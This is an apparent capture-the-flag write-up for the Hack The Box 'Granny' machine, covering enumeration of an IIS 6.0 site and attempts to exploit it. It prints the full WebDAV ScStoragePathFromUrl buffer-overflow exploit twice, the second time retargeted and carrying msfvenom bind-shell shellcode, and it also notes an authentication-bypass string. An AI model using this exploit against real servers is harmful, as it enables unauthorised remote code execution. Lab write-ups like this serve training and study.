# Website

The website shows a Microsoft IIS under construction page:

![[Pasted image 20210506083252.png]]

There was nothing interesting in the source code.

I tried `/index.html`, but got a 404:

![[Pasted image 20210506083329.png]]

I also tried `/index.php`, `/index.asp`, `/index.jsp`, but got no hits. As we don't know what extension it is, I ran a gobuster at this point with the default extension (`.html`).

`/_private` was a hit:

![[Pasted image 20210506083738.png]]

I made a note to potentially dirbust subpages in this directory if I ran out of ideas.

`/aspnet_client` was also a hit, and seemed to provide directory listing:

![[Pasted image 20210506083852.png]]

There were some javascript files, but they did not look interesting when I inspected them. The `.htm` file was blank:

![[Pasted image 20210506084032.png]]

`/_vti_log` was another empty one - at this point I realised this and `_private` could not be further dirbusted, as they did not have any more files in them:

![[Pasted image 20210506084213.png]]

`/_vti_bin` was the last page:

![[Pasted image 20210506084248.png]]

it contained some DLL files in the `adm` directory. One of them, `/_vti_bin/_vti_adm/fpadmdll.dll`, required authentication:

![[Pasted image 20210506084346.png]]

I tried a couple of common credentials, but didn't get in. I searched for IIS default creds, but didn't find much useful information. The [docs](https://docs.microsoft.com/en-us/iis/configuration/system.webserver/management/authentication/credentials/) explained how they might be setup, but nothing more.

We can view `admin.dll`, but it doesn't seem useful:

![[Pasted image 20210506084830.png]]

The other files in the `_vti_bin` directory were similar.

The `/images` directory was also empty.

I didn't know what to do here, so I launched some [[Writeups/Hack the Box/Boxes/Granny/5 - Enumeration#Extra Gobuster|more scans]]. They ultimately didn't find anything useful.

## IIS Exploits

I tried a few things before I found the right path here. As usual, you can [[Writeups/Hack the Box/Boxes/Granny/10 - Website#WebDAV Upload|skip to the working exploit]] if you wish.

I decided to look up vulnerabilities in the services, as my scans were finding nothing. I ran a search against Exploit DB for Microsoft IIS:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/granny]
└─$ searchsploit IIS
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------

Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                                                                                                | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                                                                                                  | windows/dos/9587.txt
Microsoft IIS 5.1 - Hit Highlighting Authentication Bypass                                                                                                             | windows/remote/4016.sh
Microsoft IIS 5.1 - WebDAV HTTP Request Source Code Disclosure                                                                                                         | windows/remote/26230.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                                                                                           | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                                                                                 | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                                                                               | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                                                                                                                | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                                                                            | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                                                                            | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                                                                        | windows/remote/8754.patch
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                                                                               | windows/remote/19033.txt
```

There wasn't much indication of what *might* work as the website was bare bones, so I just looked at the first exploit.

### IIS Buffer Overflow

It seems to cause a buffer overflow in WebDAV, which is present on the box according to `nmap`.

```python
'''
Description:Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 allows remote attackers to execute arbitrary code via a long header beginning with "If: <http://" in a PROPFIND request, as exploited in the wild in July or August 2016.

Additional Information: the ScStoragePathFromUrl function is called twice
Vulnerability Type: Buffer overflow
Vendor of Product: Microsoft
Affected Product Code Base: Windows Server 2003 R2
Affected Component: ScStoragePathFromUrl
Attack Type: Remote
Impact Code execution: true
Attack Vectors: crafted PROPFIND data

Has vendor confirmed or acknowledged the vulnerability?:true

Discoverer:Zhiniang Peng and Chen Wu.
Information Security Lab & School of Computer Science & Engineering, South China University of Technology Guangzhou, China
'''

#------------Our payload set up a ROP chain by using the overflow 3 times. It will launch a calc.exe which shows the bug is really dangerous.
#written by Zhiniang Peng and Chen Wu. Information Security Lab & School of Computer Science & Engineering, South China University of Technology Guangzhou, China 
#-----------Email: edwardz@foxmail.com

import socket  

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
sock.connect(('127.0.0.1',80))  

pay='PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n'
pay+='If: <http://localhost/aaaaaaa'
pay+='\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5\x95\xa7\xe6\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1\x98\xe6\xa9\x91\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80\xb4\xe5\x91\x83\xe7\x9d\x92\xe5\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3\x9d\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84\xe6\xa1\xaa\xe3\x8d\xb4\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88\xb0\xe3\x9d\xae\xe4\xad\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf\xe7\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x89\x8b\xe6\x95\x97\xe7\x95\x90\xe6\xa9\xb2\xe7\xa9\xab\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80\xb3\xe3\x95\xb7\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac'
pay+='>'
pay+=' (Not <locktoken:write1>) <http://localhost/bbbbbbb'
pay+='\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5\x85\x97\xe3\xa1\x8e\xe5\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d\x98\xe7\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5\x91\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad\xe3\x95\x88\xe6\x85\xb7\xe4\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6\x8d\x93\xe6\xad\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93\xe7\xa9\xa3\xe7\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3\x98\xb9\xe6\xb0\xb9\xe4\x94\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81'

shellcode='VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB6X6WMV7O7Z8Z8Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LMX1ZLP0V3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O02LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XKQ3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJZ2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3ULY7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA'

pay+=shellcode
pay+='>\r\n\r\n'
print pay

sock.send(pay)  
data = sock.recv(80960)  

print data 
sock.close
```

The payload, however, is set to launch `calc.exe`. We want to give ourselves a shell, so we can [generate some code](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) using `msfvenom` that will create a bind shell that we can connect to:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/granny]
└─$ msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python
```

This gives us a chunk of python code that we can drop into the script. If we wanted to view it in a similar format to the shellcode in the original exploit, we could use the `-f c` flag instead.

I mirrored the exploit with `searchsploit -m windows/remote/41738.py` so I could edit it, and added our code:

```python
'''
Description:Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 allows remote attackers to execute arbitrary code via a long header beginning with "If: <http://" in a PROPFIND request, as exploited in the wild in July or August 2016.

Additional Information: the ScStoragePathFromUrl function is called twice
Vulnerability Type: Buffer overflow
Vendor of Product: Microsoft
Affected Product Code Base: Windows Server 2003 R2
Affected Component: ScStoragePathFromUrl
Attack Type: Remote
Impact Code execution: true
Attack Vectors: crafted PROPFIND data

Has vendor confirmed or acknowledged the vulnerability?:true

Discoverer:Zhiniang Peng and Chen Wu.
Information Security Lab & School of Computer Science & Engineering, South China University of Technology Guangzhou, China
'''

#------------Our payload set up a ROP chain by using the overflow 3 times. It will launch a calc.exe which shows the bug is really dangerous.
#written by Zhiniang Peng and Chen Wu. Information Security Lab & School of Computer Science & Engineering, South China University of Technology Guangzhou, China 
#-----------Email: edwardz@foxmail.com

import socket  

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
sock.connect(('10.10.10.15',80))  

pay='PROPFIND / HTTP/1.1\r\nHost: 10.10.10.15\r\nContent-Length: 0\r\n'
pay+='If: <http://10.10.10.15/aaaaaaa'
pay+='\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5\x95\xa7\xe6\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1\x98\xe6\xa9\x91\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80\xb4\xe5\x91\x83\xe7\x9d\x92\xe5\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3\x9d\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84\xe6\xa1\xaa\xe3\x8d\xb4\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88\xb0\xe3\x9d\xae\xe4\xad\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf\xe7\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x89\x8b\xe6\x95\x97\xe7\x95\x90\xe6\xa9\xb2\xe7\xa9\xab\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80\xb3\xe3\x95\xb7\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac'
pay+='>'
pay+=' (Not <locktoken:write1>) <http://10.10.10.15/bbbbbbb'
pay+='\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5\x85\x97\xe3\xa1\x8e\xe5\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d\x98\xe7\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5\x91\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad\xe3\x95\x88\xe6\x85\xb7\xe4\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6\x8d\x93\xe6\xad\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93\xe7\xa9\xa3\xe7\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3\x98\xb9\xe6\xb0\xb9\xe4\x94\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81'

#shellcode='VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB6X6WMV7O7Z8Z8Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LMX1ZLP0V3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O02LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XKQ3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJZ2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3ULY7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA'

# our shellcode for a bind shell

buf =  b""
buf += b"\xd9\xf7\xd9\x74\x24\xf4\xbb\x7e\xa1\x83\xa0\x5a\x31"
buf += b"\xc9\xb1\x60\x31\x5a\x17\x83\xea\xfc\x03\x24\xb2\x61"
buf += b"\x55\x65\x31\xfd\xa6\x31\xe1\x33\x1f\x4d\x32\x38\xfe"
buf += b"\x84\xf3\x71\xa6\x55\xed\x8e\x68\x37\xfd\x6d\xe5\x4d"
buf += b"\x7b\xb7\x86\x1e\xdf\x65\xdd\x3b\xf1\x81\x4f\x20\xba"
buf += b"\xe2\xc5\x44\xb9\xdc\xe7\x9c\x58\x35\xba\xb1\xb5\x87"
buf += b"\x74\x36\xa0\xa0\x6f\x4a\x24\x1c\xaa\x57\x10\x7b\x48"
buf += b"\x50\x33\x60\xcf\x50\x8a\x6e\xd2\xe6\x8e\x47\x5e\x37"
buf += b"\x49\x78\x34\xc3\x3a\x6c\x2a\xe9\x2d\xfc\xf6\x10\x38"
buf += b"\x4e\x04\xdc\x13\xea\xa5\x2e\xb7\x4d\x3a\x97\x39\x4c"
buf += b"\x95\xd7\x3e\xf2\x34\xe8\x51\xfe\xa2\x1c\xa7\xa4\x0f"
buf += b"\x55\x92\xce\xeb\x02\xde\x33\x16\x8e\x17\x92\x9e\x6f"
buf += b"\x16\x3d\x8a\x67\x3f\xd2\x25\xdf\x57\xec\xce\x31\x52"
buf += b"\xbc\x14\x08\x79\x8b\x9a\xa7\x46\x94\xe0\x44\x1e\xa1"
buf += b"\x62\x5c\xe8\x0d\xa3\xc9\xe3\x0b\xf7\xc5\x07\x63\xd6"
buf += b"\x35\x03\x58\x1f\xe1\xd4\x3f\xf1\x6e\x3d\x84\xf5\x14"
buf += b"\x8e\xa8\x1e\x39\xc3\x13\x6a\xae\xcb\xa9\x4b\x7f\x3d"
buf += b"\x12\x45\xbb\xdf\x87\x97\xed\xe1\x1b\xbc\x5d\x38\x7c"
buf += b"\x84\x5f\x0a\xf7\xa5\xbd\xeb\xfb\x60\xcb\xb2\xf1\x14"
buf += b"\x0e\x76\xfd\xa1\x27\x01\x02\x41\xb4\xe9\x59\x3e\xdc"
buf += b"\xf8\x3f\x0b\x9a\xe8\xf7\xfb\x65\x10\x70\x1d\xf9\x27"
buf += b"\x12\x93\x10\x37\x0a\x91\x90\xbb\x81\x3f\x27\x4e\x12"
buf += b"\xf3\xdf\xde\x18\x0e\xfa\xb6\x8f\x15\xa4\x8b\x6a\xaf"
buf += b"\xf4\x2f\x1c\xab\x53\xfa\x54\x34\xd7\xdb\x06\x7b\x09"
buf += b"\xc0\x84\xa3\xe6\xf3\x82\x9d\xf6\xc7\xf4\x06\xcc\x69"
buf += b"\xdd\x5a\x46\x33\x44\xd2\xbd\x8d\x26\xa5\x9f\x5c\xdf"
buf += b"\x3f\x95\xee\x73\x76\xff\xdd\x5e\x85\x06\xea\xcd\xfd"
buf += b"\x4f\x53\x13\x47\x94\x42\x04\x0f\xa5\x0c\xee\x8b\x7a"
buf += b"\x38\x6a\x53\x78\x07\x68\xb5\xf6\x6f\xa1\x5a\xd4\x76"
buf += b"\x0e\x25\x78\xb3\x50\x9f\xb9\x22\x4d\x9f\x59\xf1\x04"
buf += b"\x87\x61\x02\xd1\xd1\x88\xb9\x9c\x4d\x0b\x67\x8e\x12"
buf += b"\xc0\xa8\x91\xf1"


pay+=str(buf)
pay+='>\r\n\r\n'
#print(pay)

#encode as bytes before sending
sock.send(pay.encode('utf-8'))  
data = sock.recv(80960)  

print(data) 
sock.close
```

I also changed the target from localhost to `10.10.10.15` and edited the print statements to be in `python3` format. I had to cast my `buf` to a string before concatenating it, then encode the whole payload as bytes before sending it over the socket - I'm not sure why the original exploit *didn't* need to do this, but hey ho.

Running the exploit does seem to cause the server to crash, which I think is a good sign:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/granny]
└─$ python3 41738.py 
b'HTTP/1.1 500 Internal Server Failure\r\nConnection: close\r\nDate: Thu, 06 May 2021 08:23:12 GMT\r\nServer: Microsoft-IIS/6.0\r\nMicrosoftOfficeWebServer: 5.0_Pub\r\nX-Powered-By: ASP.NET\r\nContent-Type: text/html\r\nContent-Length: 67\r\n\r\n<body><h1>HTTP/1.1 500 Internal Server Error(exception)</h1></body>'
```

However, a quick full ports scan reveals that no new ports are open, so I'm not sure if our bind shell payload actually executed:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/granny]
└─$ nmap -p- --min-rate 10000 10.10.10.15
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-06 09:20 BST
Nmap scan report for 10.10.10.15
Host is up (0.042s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.25 seconds
```

I wasn't sure what I was doing wrong here, so I went back to the other exploits.

### Authentication Bypass

There was a promising exploit involving authentication bypass that I thought might give us access to the password protected file from before: `searchsploit -x windows/remote/8704.txt`.

It involves sending a URL-encoded string `%c0%af` in the URL that causes WebDAV to process the request and send the contents back without authentication.

I requested the following URL: `http://10.10.10.15/_vti_bin/_vti_adm/fp%c0%afadmdll.dll` - but I got a 404 error. I tried this in a few locations, to no avail.

### WebDAV

I got a hint to look more at WebDAV. The Public Options include `MOVE` and `PUT` - this suggests we may be able to upload a file.

We still weren't sure what file options were supported, so I looked at the headers of the site:

```bash
──(mac㉿kali)-[~/Documents/HTB/granny]
└─$ curl -v 10.10.10.15
*   Trying 10.10.10.15:80...
* Connected to 10.10.10.15 (10.10.10.15) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.10.15
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Content-Length: 1433
< Content-Type: text/html
< Content-Location: http://10.10.10.15/iisstart.htm
< Last-Modified: Fri, 21 Feb 2003 15:48:30 GMT
< Accept-Ranges: bytes
< ETag: "05b3daec0d9c21:348"
< Server: Microsoft-IIS/6.0
< MicrosoftOfficeWebServer: 5.0_Pub
< X-Powered-By: ASP.NET
< Date: Thu, 06 May 2021 08:38:19 GMT
< 
...[snip]...
```

This shows the site is powered by ASP.NET.

#### WebDAV Upload

It seems like [plain old curl](https://stackoverflow.com/questions/1205101/command-line-utility-for-webdav-upload) can be used to upload a file to vulnerable WebDAV sites.

